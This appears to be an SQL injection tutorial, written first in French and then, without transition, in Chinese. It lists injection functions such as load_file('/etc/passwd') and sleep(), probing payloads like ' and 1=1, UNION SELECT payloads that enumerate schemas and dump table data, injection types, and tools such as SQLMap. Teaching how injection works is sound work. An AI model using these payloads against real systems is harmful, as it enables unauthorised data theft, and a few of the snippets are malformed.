## I. Aperçu de l'injection SQL

1) L'injection SQL est une méthode d'attaque de réseau qui permet d'ajouter des instructions SQL malveillantes dans les chaînes d'entrée de l'utilisateur afin d'exécuter des commandes non planifiées ou d'accéder à des données non autorisées.
2. l'injection SQL est causée par le manque d'attention portée à la standardisation de l'écriture des instructions SQL et au filtrage des caractères spéciaux pendant le développement d'une application, ce qui fait que l'instruction SQL dans la chaîne saisie par l'utilisateur est prise par le serveur de base de données pour une instruction SQL normale et exécutée. l'injection SQL peut également être causée par l'utilisation de l'épissage de chaîne pour construire l'instruction SQL sans utiliser de requête paramétrée.

## II. syntaxe des opérations de base du langage SQL

1) L'apprentissage de l'injection SQL nécessite une certaine connaissance du langage SQL, une compréhension des instructions et fonctions SQL courantes, ainsi que de la structure et du fonctionnement de la base de données. 
2) **_Enoncés SQL couramment utilisés_** Il y a les suivants : 
   - Requête : l'instruction SELECT permet de sélectionner des données dans une table. Vous pouvez spécifier le nom des colonnes, les conditions, le tri, etc. pour effectuer la requête. Exemple :
```sql
SELECT * FROM person WHERE age > 18 ORDER BY name;
```

   - ADD : Utilisez l'instruction INSERT INTO pour insérer de nouvelles lignes dans un tableau en spécifiant les noms et les valeurs des colonnes à insérer. Exemple :
```sql
INSERT INTO person (id, name, age, gender) VALUES (1, 'sam', 20, 'Male');
```

   - Supprimer : l'instruction DELETE permet de supprimer des lignes d'un tableau et de spécifier les conditions de suppression des lignes. Vous pouvez spécifier les conditions dans lesquelles les lignes doivent être supprimées.
```sql
DELETE FROM person WHERE id = 1;
```

    - Modifier : Utilisez l'instruction UPDATE pour modifier les données d'une table. Vous pouvez spécifier les noms et les valeurs des colonnes à modifier ainsi que les conditions de la modification. Exemple :
```sql
UPDATE person SET age = 21 WHERE id = 1;
```

3) Les fonctions SQL couramment utilisées sont des types suivants : 
   - Fonctions numériques : utilisées pour calculer ou convertir des valeurs numériques, telles que ABS, ROUND, FLOOR, CEIL, POWER, SQRT, SIN, COS, LOG, etc.
   - Fonctions de chaîne : utilisées pour opérer sur des chaînes ou des traitements, telles que CONCAT, SUBSTRING, LENGTH, REPLACE, TRIM, UPPER, LOWER, REVERSE, etc.
   - Fonctions de date et d'heure : utilisées pour formater ou calculer la date et l'heure, telles que CURDATE, CURTIME, NOW, DATE_FORMAT, DATE_ADD, DATE_SUB, DATEDIFF, TIMEDIFF, etc.
   - Fonction d'agrégation : utilisée pour un groupe de valeurs à des fins statistiques ou analytiques, comme SUM, AVG, MIN, MAX, COUNT, DISTINCT, GROUP_CONCAT, etc.
   - Fonctions de fenêtre : utilisées pour trier ou calculer les données après le regroupement, telles que ROW_NUMBER, RANK, DENSE_RANK, NTILE, LAG, LEAD, FIRST_VALUE, LAST_VALUE, etc.
   - 
4. **_MySQL's information_schema_**. information_schema est une base de données MySQL spéciale qui fournit des métadonnées sur le serveur MySQL, telles que les noms des bases de données ou des tables, les types de données des colonnes ou les droits d'accès. Ces informations sont parfois appelées dictionnaire de données ou catalogue système. Vous pouvez utiliser des instructions SQL standard pour interroger les tables de l'information_schema afin d'obtenir des informations sur les métadonnées. En injection SQL, vous pouvez généralement utiliser cette bibliothèque pour interroger des données dans d'autres bibliothèques 
```sql
SELECT TABLE_NAME, TABLE_TYPE
FROM information_schema.TABLES;
```
 

## III. fonctions et déclarations couramment utilisées dans les injections SQL

1. **_Fonctions couramment utilisées dans l'injection SQL_** L'injection SQL est une technique d'attaque qui tire parti de vulnérabilités dans les instructions SQL pour envoyer des commandes SQL malveillantes à une base de données afin d'obtenir des informations sensibles ou d'effectuer des opérations illégales.Les fonctions couramment utilisées dans l'injection SQL sont les suivantes : 
   - database() : cette fonction affiche le nom de la bibliothèque de base de données actuellement utilisée. Exemple :
```sql
SELECT database();
```

   - substring() : cette fonction extrait le contenu d'un champ à partir du champ spécifié. Exemple : cette fonction extrait le contenu d'un champ à partir du champ spécifié :
```sql
SELECT substring('hello', 1, 2); -- cela donne 'he'
SELECT substring(name, 1, 2) FROM person; -- cela retourne les deux premiers caractères de la colonne name dans la table person
```

   - length()：该函数可以返回指定字符串或字段的长度。例如：
```sql
SELECT length('hello'); -- 返回 5
SELECT length(name) FROM person; -- 返回 person 表中 name 列的长度
```

   - concat()：该函数可以将多个字符串或字段连接起来。例如：
```sql
SELECT concat('hello', 'world'); -- 返回 'helloworld'
SELECT concat(name, age) FROM person; -- 返回 person 表中 name 列和 age 列的连接
```

   - group_concat()：该函数可以将一组值连接起来，常用于分组查询。例如：
```sql
SELECT gender, group_concat(name) FROM person GROUP BY gender; -- 返回 person 表中按性别分组的姓名列表
```

   - hex()：该函数可以将字符串或数字转换为十六进制。例如：
```sql
SELECT hex('hello'); -- 返回 '68656C6C6F'
SELECT hex(123); -- 返回 '7B'
```

   - unhex()：该函数可以将十六进制转换为字符串或数字。例如：
```sql
SELECT unhex('68656C6C6F'); -- 返回 'hello'
SELECT unhex('7B'); -- 返回 123
```

   - load_file()：该函数可以读取指定文件的内容。例如：
```sql
SELECT load_file('/etc/passwd'); -- 返回 /etc/passwd 文件的内容
```

   - user()：该函数可以返回当前数据库连接使用的用户。例如：
```sql
SELECT user(); -- 返回 'root@localhost'
```

   - version()：该函数可以返回当前数据库的版本。例如：
```sql
SELECT version(); -- 返回 '8.0.26'
```

   - sleep()：该函数可以使数据库暂停指定的秒数。例如：
```sql
SELECT sleep(5); -- 使数据库暂停 5 秒
```

   - floor()：该函数可以返回不大于指定数值的最大整数。例如：
```sql
SELECT floor(3.14); -- 返回 3
```

   - rand()：该函数可以返回一个随机数。例如：
```sql
SELECT rand(); -- 返回 0.123456
```

2.  **_SQL注入中的常用语句_** 
   -  判断有无注入点：在URL或表单中输入如下语句，看页面是否有变化。 
```sql
' and 1=1
#或
' and 1=2
```
 

   -  猜测表名：在URL或表单中输入如下语句，看是否存在admin这张表。 
```sql
and 0<> (select count (*) from *)
#或
and 0<> (select count (*) from admin)
```
 

   -  获取数据库版本：在URL或表单中输入如下语句，看是否能显示数据库版本。 
```sql
and 1= (select @@VERSION)
#或
and 1= (select version())
```
 

   -  获取数据库名：在URL或表单中输入如下语句，看是否能显示数据库名。 
```sql
and 1= (select db_name ())
#或
and 1= (select database())
```
 

   -  获取表名：在URL或表单中输入如下语句，看是否能显示表名。 
```sql
and 1= (select top 1 name from sysobjects where xtype='U')
#或
and 1= (select table_name from information_schema.tables limit 1)
```
 

   -  获取列名：在URL或表单中输入如下语句，看是否能显示列名。 
```sql
and 1= (select top 1 name from syscolumns where id=object_id('表名')
#或
and 1= (select column_name from information_schema.columns where table_name='表名'limit 1)
```
 

   -  获取数据：在URL或表单中输入如下语句，看是否能显示数据。 
```sql
and 1= (select top 1 列名 from 表名)
#或
and 1= (select 列名 from 表名 limit 1)
```
 
## 四、SQL注入中的常用命令

   1.  SQL注入中的常用命令示例： 
      -  查看当前用户 
```sql
union select 1, (select user ())–+
```
 

      -  查看数据库版本 
```sql
union select 1, (select version ())–+
```
 

      -  查看当前数据库名 
```sql
union select 1, (select database ())–+
```
 

      -  查看所有数据库名 
```sql
union select 1, (select group_concat (schema_name) from information_schema.schemata)–+
```
 

      -  查看某个数据库的所有表名 
```sql
union select 1, (select group_concat (table_name) from information_schema.tables where table_schema='数据库名')–+
```
 

      -  查看某个表的所有列名 
```sql
union select 1, (select group_concat (column_name) from information_schema.columns where table_name='表名')–+
```
 

      -  查看某个列的所有数据 
```sql
union select 1, (select group_concat (列名) from 表名)–+
```
 

## 五、SQL注入的类别

1. SQL注入的种类有以下几种： 
   - 联合注入：可以使用union的情况下的注入。
   - 布尔盲注：不能根据页面返回内容判断任何信息，只能根据条件真假来判断。
   - 报错注入：页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
   - 时间盲注：不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行来判断。
   - 堆叠注入：可以同时执行多条语句的执行时的注入。
   - 二次注入：在数据库中存储了用户的输入，再次执行时触发的注入。
   - 宽字节注入：利用字符编码的差异，绕过过滤的注入。
   - Cookie注入：利用Cookie中的参数进行注入

## 六、SQL注入常用的检测方法

1. SQL注入常用的检测方法有以下几种： 
   - 动态检测：通过向数据库发送特殊的SQL语句，观察数据库的响应，判断是否存在SQL注入漏洞。
   - 静态检测：通过分析程序源代码，找出可能存在SQL注入风险的语句，进行修复或优化。
   - 插入单、双引号：通过在参数中添加单引号或双引号，看是否出现数据库错误提示，判断是否有注入点。
   - 使用SQL注入检测工具：例如SQLMap、SQLNinja、Havij等，可以自动化地发现和利用SQL注入漏洞
